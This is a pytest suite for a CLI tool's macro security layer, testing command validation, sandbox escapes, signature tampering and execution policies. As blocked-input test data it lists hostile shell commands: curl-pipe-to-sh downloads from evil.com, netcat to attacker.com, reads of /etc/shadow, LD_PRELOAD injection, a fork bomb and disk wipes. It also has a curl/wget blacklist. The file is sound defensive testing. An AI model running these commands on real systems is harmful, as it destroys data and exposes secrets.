"""
Comprehensive tests for macro security and injection prevention
Tests command validation, sandboxing, and signature verification
"""

import pytest
import json
import tempfile
from pathlib import Path
import hashlib
import hmac
import os
import subprocess
import shlex
from unittest.mock import MagicMock, patch, call
import time
from datetime import datetime, timedelta

from app.cli.productivity.macros import (
    MacroManager,
    Macro,
    CommandValidator,
    MacroSandbox,
    SignatureVerifier,
    ExecutionPolicy,
)


class TestCommandValidator:
    """Test command validation for security"""

    @pytest.fixture
    def validator(self):
        return CommandValidator()

    def test_block_dangerous_commands(self, validator):
        """Test blocking of dangerous system commands"""
        dangerous_commands = [
            "rm -rf /",
            "rm -rf /*",
            "del /f /s /q C:\\*",
            "format C:",
            "sudo rm -rf /",
            "chmod 777 /etc/passwd",
            "chown root:root /",
            ":(){:|:&};:",  # Fork bomb
            "dd if=/dev/zero of=/dev/sda",
            "mkfs.ext4 /dev/sda",
            "kill -9 -1",
            "pkill -9 .*",
            "shutdown -h now",
            "reboot",
            "init 0",
        ]

        for cmd in dangerous_commands:
            result = validator.validate(cmd)
            assert result.is_safe is False
            assert len(result.violations) > 0
            assert any(
                "dangerous" in v.lower() or "blocked" in v.lower()
                for v in result.violations
            )

    def test_detect_shell_injection(self, validator):
        """Test detection of shell injection attempts"""
        injection_attempts = [
            "img convert file.jpg; cat /etc/passwd",
            "img convert file.jpg && curl evil.com/malware.sh | sh",
            "img convert file.jpg || nc attacker.com 1234",
            "img convert `cat /etc/passwd`.jpg",
            "img convert $(whoami).jpg",
            "img convert file.jpg | tee /etc/crontab",
            "img convert file.jpg > /etc/passwd",
            "img convert file.jpg < /etc/shadow",
            "img convert $(/bin/sh -c 'evil').jpg",
            "img convert file.jpg\nrm -rf /",
            "img convert file.jpg\r\nformat C:",
            "img convert file.jpg; python -c 'import os; os.system(\"evil\")'",
            "img convert file.jpg & start malware.exe",
        ]

        for attempt in injection_attempts:
            result = validator.validate(attempt)
            assert result.is_safe is False
            assert any(
                "injection" in v.lower() or "shell" in v.lower()
                for v in result.violations
            )

    def test_detect_path_traversal(self, validator):
        """Test detection of path traversal attempts"""
        traversal_attempts = [
            "img convert ../../../etc/passwd",
            "img convert ..\\..\\..\\Windows\\System32\\config\\sam",
            "img convert /etc/passwd -o output.jpg",
            "img convert file.jpg -o /etc/passwd",
            "img convert ~/../../root/.ssh/id_rsa",
            "img convert file.jpg -o ../../../var/www/shell.php",
            "img convert %2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
            "img convert file.jpg -o C:\\Windows\\System32\\drivers\\etc\\hosts",
        ]

        for attempt in traversal_attempts:
            result = validator.validate(attempt)
            # Should flag suspicious paths
            if any(
                x in attempt.lower() for x in ["/etc/", "/windows/", "/root/", ".ssh"]
            ):
                assert result.warnings is not None
                assert len(result.warnings) > 0

    def test_detect_command_chaining(self, validator):
        """Test detection of command chaining"""
        chained_commands = [
            "img convert a.jpg; img convert b.jpg; img convert c.jpg",
            "img convert a.jpg && img convert b.jpg && img convert c.jpg",
            "img convert a.jpg || img convert b.jpg",
            "img convert a.jpg | img convert -",
            "img convert a.jpg & img convert b.jpg",
        ]

        for cmd in chained_commands:
            result = validator.validate(cmd)
            # Chaining might be allowed but should be noted
            if result.is_safe:
                assert result.warnings is not None
                assert any(
                    "chain" in w.lower() or "multiple" in w.lower()
                    for w in result.warnings
                )

    def test_validate_safe_commands(self, validator):
        """Test that safe commands pass validation"""
        safe_commands = [
            "img convert photo.jpg -f webp",
            "img batch process --input-dir ./images --output-dir ./output",
            "img optimize image.png --preset web-optimized",
            "img watch ./photos --format avif",
            "img profile switch web-optimized",
            "img convert 'file with spaces.jpg' -o 'output file.webp'",
            "img convert photo.jpg --quality 85 --format webp --output result.webp",
        ]

        for cmd in safe_commands:
            result = validator.validate(cmd)
            assert result.is_safe is True
            assert len(result.violations) == 0

    def test_environment_variable_injection(self, validator):
        """Test detection of environment variable injection"""
        env_injections = [
            "img convert $PATH.jpg",
            "img convert ${HOME}/.ssh/id_rsa",
            "img convert %USERPROFILE%\\Documents\\passwords.txt",
            "img convert $AWS_SECRET_ACCESS_KEY.jpg",
            "PATH=/evil/path img convert file.jpg",
            "LD_PRELOAD=/tmp/evil.so img convert file.jpg",
        ]

        for injection in env_injections:
            result = validator.validate(injection)
            if "$" in injection or "%" in injection or "=" in injection:
                assert result.warnings is not None or result.is_safe is False

    def test_network_command_detection(self, validator):
        """Test detection of network-related commands"""
        network_commands = [
            "img convert file.jpg; wget evil.com/malware",
            "img convert file.jpg; curl -X POST secrets.com",
            "img convert file.jpg; nc -l 1234",
            "img convert file.jpg; ssh attacker@evil.com",
            "img convert file.jpg; telnet evil.com",
            "img convert file.jpg; ftp upload.com",
        ]

        for cmd in network_commands:
            result = validator.validate(cmd)
            assert result.is_safe is False
            assert any(
                "network" in v.lower() or "blocked" in v.lower()
                for v in result.violations
            )

    def test_file_operation_detection(self, validator):
        """Test detection of dangerous file operations"""
        file_operations = [
            "img convert file.jpg; chmod 777 /tmp/file",
            "img convert file.jpg; chown root /tmp/file",
            "img convert file.jpg; ln -s /etc/passwd /tmp/link",
            "img convert file.jpg; mv /etc/passwd /tmp/",
            "img convert file.jpg; cp /etc/shadow /tmp/",
        ]

        for cmd in file_operations:
            result = validator.validate(cmd)
            assert result.is_safe is False


class TestMacroSandbox:
    """Test macro execution sandboxing"""

    @pytest.fixture
    def sandbox(self):
        return MacroSandbox()

    def test_sandbox_initialization(self, sandbox):
        """Test sandbox initializes with restrictions"""
        assert sandbox.max_execution_time > 0
        assert sandbox.max_memory_mb > 0
        assert sandbox.allowed_paths is not None
        assert sandbox.blocked_syscalls is not None

    def test_sandbox_file_access_restrictions(self, sandbox, tmp_path):
        """Test file access restrictions in sandbox"""
        # Create test structure
        allowed_dir = tmp_path / "allowed"
        restricted_dir = tmp_path / "restricted"
        allowed_dir.mkdir()
        restricted_dir.mkdir()

        sandbox.allowed_paths = [str(allowed_dir)]

        # Test allowed access
        allowed_file = allowed_dir / "test.jpg"
        allowed_file.touch()
        assert sandbox.check_file_access(str(allowed_file)) is True

        # Test restricted access
        restricted_file = restricted_dir / "secret.txt"
        restricted_file.touch()
        assert sandbox.check_file_access(str(restricted_file)) is False

        # Test system file access
        assert sandbox.check_file_access("/etc/passwd") is False
        assert sandbox.check_file_access("C:\\Windows\\System32\\config") is False

    def test_sandbox_network_blocking(self, sandbox):
        """Test network access blocking in sandbox"""
        # Mock network operations
        with patch("socket.socket") as mock_socket:
            mock_socket.side_effect = PermissionError("Network access denied")

            with pytest.raises(PermissionError):
                sandbox.execute_with_restrictions(lambda: __import__("socket").socket())

    def test_sandbox_resource_limits(self, sandbox):
        """Test resource limit enforcement"""

        # Test memory limit
        def memory_hog():
            data = []
            for _ in range(1000000):
                data.append("x" * 1024)  # Try to allocate lots of memory
            return data

        with patch.object(sandbox, "check_memory_usage") as mock_check:
            mock_check.return_value = False  # Simulate memory limit exceeded

            with pytest.raises(MemoryError):
                sandbox.execute_with_restrictions(memory_hog)

    def test_sandbox_timeout_enforcement(self, sandbox):
        """Test execution timeout enforcement"""
        sandbox.max_execution_time = 1  # 1 second timeout

        def infinite_loop():
            while True:
                time.sleep(0.1)

        with pytest.raises(TimeoutError):
            sandbox.execute_with_timeout(infinite_loop)

    def test_sandbox_subprocess_restrictions(self, sandbox):
        """Test subprocess execution restrictions"""
        # Should block subprocess creation
        dangerous_commands = [
            ["rm", "-rf", "/"],
            ["format", "C:"],
            ["curl", "evil.com"],
            ["python", "-c", "import os; os.system('evil')"],
        ]

        for cmd in dangerous_commands:
            with pytest.raises((PermissionError, OSError)):
                sandbox.execute_subprocess(cmd)

    def test_sandbox_escape_prevention(self, sandbox):
        """Test prevention of sandbox escape attempts"""
        escape_attempts = [
            # Python escape attempts
            lambda: __import__("os").system("evil"),
            lambda: __import__("subprocess").call(["evil"]),
            lambda: eval("__import__('os').system('evil')"),
            lambda: exec("import os; os.system('evil')"),
            # File system escape
            lambda: open("/etc/passwd", "r"),
            lambda: __import__("shutil").rmtree("/"),
        ]

        for attempt in escape_attempts:
            with pytest.raises((PermissionError, ImportError, OSError)):
                sandbox.execute_with_restrictions(attempt)

    def test_sandbox_safe_execution(self, sandbox):
        """Test that safe operations work in sandbox"""
        # Safe operations should work
        safe_ops = [
            lambda: 2 + 2,
            lambda: "hello".upper(),
            lambda: [1, 2, 3].append(4),
            lambda: {"key": "value"}.get("key"),
        ]

        for op in safe_ops:
            result = sandbox.execute_with_restrictions(op)
            assert result is not None


class TestSignatureVerifier:
    """Test macro signature verification"""

    @pytest.fixture
    def verifier(self):
        secret_key = b"test_secret_key_for_hmac"
        return SignatureVerifier(secret_key)

    def test_signature_generation(self, verifier):
        """Test signature generation for macros"""
        macro_data = {
            "name": "test_macro",
            "commands": ["img convert file.jpg"],
            "created_at": "2024-01-15T10:00:00Z",
        }

        signature = verifier.sign(macro_data)

        assert signature is not None
        assert len(signature) == 64  # SHA256 hex digest length
        assert all(c in "0123456789abcdef" for c in signature)

    def test_signature_verification(self, verifier):
        """Test signature verification"""
        macro_data = {"name": "test_macro", "commands": ["img convert file.jpg"]}

        # Generate signature
        signature = verifier.sign(macro_data)

        # Verify signature
        assert verifier.verify(macro_data, signature) is True

        # Modify data - signature should fail
        macro_data["commands"].append("evil command")
        assert verifier.verify(macro_data, signature) is False

    def test_signature_tampering_detection(self, verifier):
        """Test detection of tampered signatures"""
        macro_data = {"name": "macro", "commands": ["cmd"]}
        signature = verifier.sign(macro_data)

        # Tamper with signature
        tampered_signatures = [
            signature[:-1] + "0",  # Change last character
            "0" + signature[1:],  # Change first character
            signature[:32] + "0" * 32,  # Replace half
            "invalid_signature",
            "",
            None,
        ]

        for tampered in tampered_signatures:
            assert verifier.verify(macro_data, tampered) is False

    def test_signature_replay_prevention(self, verifier):
        """Test prevention of signature replay attacks"""
        macro_data = {
            "name": "macro",
            "commands": ["cmd"],
            "timestamp": datetime.now().isoformat(),
        }

        signature = verifier.sign(macro_data)

        # Signature should be valid immediately
        assert verifier.verify(macro_data, signature) is True

        # Simulate old timestamp (replay attack)
        old_data = macro_data.copy()
        old_data["timestamp"] = (datetime.now() - timedelta(hours=2)).isoformat()

        # Old signature should be rejected if timestamp validation is enabled
        with patch.object(verifier, "validate_timestamp", return_value=False):
            assert verifier.verify(old_data, signature) is False


class TestExecutionPolicy:
    """Test macro execution policies"""

    @pytest.fixture
    def policy(self):
        return ExecutionPolicy()

    def test_policy_levels(self, policy):
        """Test different policy security levels"""
        assert policy.UNRESTRICTED < policy.RESTRICTED
        assert policy.RESTRICTED < policy.PARANOID

        # Test default level
        assert policy.current_level in [
            policy.UNRESTRICTED,
            policy.RESTRICTED,
            policy.PARANOID,
        ]

    def test_policy_unrestricted(self, policy):
        """Test unrestricted execution policy"""
        policy.set_level(policy.UNRESTRICTED)

        # Should allow most commands
        assert policy.is_allowed("img convert file.jpg") is True
        assert policy.is_allowed("img batch process") is True

        # But still block extremely dangerous ones
        assert policy.is_allowed("rm -rf /") is False

    def test_policy_restricted(self, policy):
        """Test restricted execution policy"""
        policy.set_level(policy.RESTRICTED)

        # Should allow safe img commands
        assert policy.is_allowed("img convert file.jpg") is True

        # Should block system commands
        assert policy.is_allowed("ls -la") is False
        assert policy.is_allowed("cat file.txt") is False

    def test_policy_paranoid(self, policy):
        """Test paranoid execution policy"""
        policy.set_level(policy.PARANOID)

        # Should only allow whitelisted commands
        policy.whitelist = ["img convert", "img optimize"]

        assert policy.is_allowed("img convert file.jpg") is True
        assert policy.is_allowed("img optimize image.png") is True
        assert policy.is_allowed("img batch process") is False
        assert policy.is_allowed("anything else") is False

    def test_policy_command_whitelist(self, policy):
        """Test command whitelisting"""
        policy.whitelist = ["img convert", "img batch", "img optimize"]

        assert policy.is_command_whitelisted("img convert file.jpg") is True
        assert policy.is_command_whitelisted("img batch process") is True
        assert policy.is_command_whitelisted("rm -rf /") is False

    def test_policy_command_blacklist(self, policy):
        """Test command blacklisting"""
        policy.blacklist = ["rm", "del", "format", "dd", "curl", "wget"]

        assert policy.is_command_blacklisted("rm -rf /") is True
        assert policy.is_command_blacklisted("curl evil.com") is True
        assert policy.is_command_blacklisted("img convert") is False


class TestMacroManager:
    """Test MacroManager security features"""

    @pytest.fixture
    def manager(self, tmp_path):
        return MacroManager(storage_dir=tmp_path / "macros")

    @pytest.fixture
    def sample_macro(self):
        return Macro(
            name="convert_to_webp",
            description="Convert images to WebP",
            commands=["img convert {{input}} -f webp -q 85 -o {{output}}"],
            parameters=["input", "output"],
            created_at=datetime.now(),
            approved=False,
        )

    def test_macro_approval_required(self, manager, sample_macro):
        """Test that macros require approval before execution"""
        # Save unapproved macro
        manager.save_macro(sample_macro)

        # Try to execute unapproved macro
        with pytest.raises(PermissionError, match="not approved"):
            manager.execute_macro(
                sample_macro.name, {"input": "test.jpg", "output": "test.webp"}
            )

    def test_macro_parameter_sanitization(self, manager, sample_macro):
        """Test parameter sanitization in macros"""
        sample_macro.approved = True
        manager.save_macro(sample_macro)

        # Try injection via parameters
        malicious_params = {
            "input": "file.jpg; rm -rf /",
            "output": "output.webp && curl evil.com",
        }

        with pytest.raises(ValueError, match="Invalid parameter"):
            manager.execute_macro(sample_macro.name, malicious_params)

    def test_macro_command_validation(self, manager):
        """Test command validation when creating macros"""
        # Try to create macro with dangerous commands
        dangerous_macro = Macro(
            name="dangerous",
            commands=[
                "img convert file.jpg",
                "rm -rf /",
                "curl evil.com/malware.sh | sh",
            ],
        )

        with pytest.raises(ValueError, match="contains dangerous commands"):
            manager.save_macro(dangerous_macro)

    def test_macro_storage_security(self, manager, tmp_path):
        """Test secure storage of macros"""
        macro = Macro(
            name="test", commands=["img convert {{file}}"], parameters=["file"]
        )

        manager.save_macro(macro)

        # Check file permissions (should be 600)
        macro_file = tmp_path / "macros" / "test.json"
        assert macro_file.exists()

        # Check permissions on Unix-like systems
        if os.name != "nt":
            stat_info = os.stat(macro_file)
            mode = stat_info.st_mode & 0o777
            assert mode == 0o600  # Read/write for owner only

    def test_macro_signature_verification(self, manager, sample_macro):
        """Test signature verification on macro loading"""
        sample_macro.approved = True
        manager.save_macro(sample_macro)

        # Tamper with macro file
        macro_file = manager.storage_dir / f"{sample_macro.name}.json"
        data = json.loads(macro_file.read_text())
        data["commands"].append("evil command")
        macro_file.write_text(json.dumps(data))

        # Loading should fail due to signature mismatch
        with pytest.raises(ValueError, match="signature"):
            manager.load_macro(sample_macro.name)

    def test_macro_execution_logging(self, manager, sample_macro):
        """Test that macro executions are logged for audit"""
        sample_macro.approved = True
        manager.save_macro(sample_macro)

        with patch.object(manager, "log_execution") as mock_log:
            try:
                manager.execute_macro(
                    sample_macro.name, {"input": "test.jpg", "output": "test.webp"}
                )
            except:
                pass  # Execution might fail, we're testing logging

            mock_log.assert_called()

    def test_macro_recursive_expansion_limit(self, manager):
        """Test prevention of recursive macro expansion"""
        # Create macros that reference each other
        macro1 = Macro(name="macro1", commands=["{{macro:macro2}}"], approved=True)

        macro2 = Macro(
            name="macro2",
            commands=["{{macro:macro1}}"],  # Recursive reference
            approved=True,
        )

        manager.save_macro(macro1)
        manager.save_macro(macro2)

        # Should detect and prevent infinite recursion
        with pytest.raises(RecursionError):
            manager.execute_macro("macro1", {})

    def test_macro_dry_run_mode(self, manager, sample_macro):
        """Test dry-run execution of macros"""
        sample_macro.approved = True
        manager.save_macro(sample_macro)

        # Execute in dry-run mode
        result = manager.dry_run_macro(
            sample_macro.name, {"input": "test.jpg", "output": "test.webp"}
        )

        # Should return commands that would be executed
        assert len(result.commands) == 1
        assert "img convert test.jpg" in result.commands[0]
        assert result.would_execute is True
        assert result.estimated_time > 0


class TestMacroInjectionE2E:
    """End-to-end macro injection prevention tests"""

    @pytest.fixture
    def full_system(self, tmp_path):
        """Set up full macro system"""
        manager = MacroManager(storage_dir=tmp_path / "macros")
        validator = CommandValidator()
        sandbox = MacroSandbox()
        verifier = SignatureVerifier(b"secret_key")
        policy = ExecutionPolicy()

        return {
            "manager": manager,
            "validator": validator,
            "sandbox": sandbox,
            "verifier": verifier,
            "policy": policy,
        }

    def test_complete_security_workflow(self, full_system, tmp_path):
        """Test complete security workflow for macro execution"""
        manager = full_system["manager"]

        # 1. Create a macro
        macro = Macro(
            name="safe_convert",
            commands=["img convert {{input}} -f webp"],
            parameters=["input"],
        )

        # 2. Validate commands
        validator = full_system["validator"]
        for cmd in macro.commands:
            result = validator.validate(cmd)
            assert result.is_safe is True

        # 3. Save with signature
        manager.save_macro(macro)

        # 4. Approve macro (simulating user review)
        loaded = manager.load_macro("safe_convert")
        loaded.approved = True
        manager.save_macro(loaded)

        # 5. Execute in sandbox
        with patch.object(manager, "execute_in_sandbox") as mock_exec:
            mock_exec.return_value = {"status": "success"}

            result = manager.execute_macro("safe_convert", {"input": "photo.jpg"})

            mock_exec.assert_called_once()

    def test_injection_attempt_blocked_at_multiple_levels(self, full_system):
        """Test that injection attempts are blocked at multiple security levels"""
        manager = full_system["manager"]

        # Injection attempt in macro creation
        evil_macro = Macro(
            name="evil",
            commands=["img convert {{input}}; cat /etc/passwd"],
            parameters=["input"],
        )

        # Level 1: Command validation should block
        validator = full_system["validator"]
        for cmd in evil_macro.commands:
            result = validator.validate(cmd)
            assert result.is_safe is False

        # Level 2: Manager should reject
        with pytest.raises(ValueError):
            manager.save_macro(evil_macro)

        # Even if somehow saved, Level 3: Execution policy should block
        policy = full_system["policy"]
        policy.set_level(policy.RESTRICTED)
        assert policy.is_allowed(evil_macro.commands[0]) is False

        # Level 4: Sandbox would block system access
        sandbox = full_system["sandbox"]
        with pytest.raises((PermissionError, OSError)):
            sandbox.execute_subprocess(["cat", "/etc/passwd"])

    def test_comprehensive_injection_vectors(self, full_system):
        """Test comprehensive set of injection vectors"""
        manager = full_system["manager"]

        injection_vectors = [
            # Command injection
            {"input": "file.jpg; evil_command"},
            {"input": "file.jpg && evil_command"},
            {"input": "file.jpg || evil_command"},
            {"input": "file.jpg | evil_command"},
            # Path traversal
            {"input": "../../../etc/passwd"},
            {"input": "..\\..\\..\\Windows\\System32\\config"},
            # Command substitution
            {"input": "$(evil_command).jpg"},
            {"input": "`evil_command`.jpg"},
            # Environment variables
            {"input": "$PATH"},
            {"input": "${HOME}/.ssh/id_rsa"},
            # Special characters
            {"input": "file.jpg\nrm -rf /"},
            {"input": "file.jpg\r\ndel *.*"},
            {"input": "file.jpg\x00evil"},
            # URL encoded
            {"input": "%2e%2e%2f%2e%2e%2fetc%2fpasswd"},
            # Unicode tricks
            {"input": "file\u202e jpg.exe"},  # Right-to-left override
        ]

        # Create a simple macro
        macro = Macro(
            name="test",
            commands=["img convert {{input}} -o output.webp"],
            parameters=["input"],
            approved=True,
        )

        manager.save_macro(macro)

        for vector in injection_vectors:
            # Each vector should be caught and blocked
            with pytest.raises((ValueError, PermissionError)):
                manager.execute_macro("test", vector)

    def test_security_audit_trail(self, full_system, tmp_path):
        """Test that security events are properly logged"""
        manager = full_system["manager"]

        # Set up audit log
        audit_log = tmp_path / "audit.log"

        with patch.object(manager, "audit_log", audit_log):
            # Attempt various security violations
            violations = [
                ("create_dangerous", Macro(name="bad", commands=["rm -rf /"])),
                ("execute_unapproved", "nonexistent_macro"),
                ("tampered_signature", "modified_macro"),
                ("injection_attempt", {"input": "file.jpg; evil"}),
            ]

            for event_type, data in violations:
                try:
                    if event_type == "create_dangerous":
                        manager.save_macro(data)
                    elif event_type == "execute_unapproved":
                        manager.execute_macro(data, {})
                    # ... handle other types
                except:
                    pass  # Expected to fail

            # Check audit log contains security events
            if audit_log.exists():
                log_content = audit_log.read_text()
                assert (
                    "security" in log_content.lower()
                    or "violation" in log_content.lower()
                )
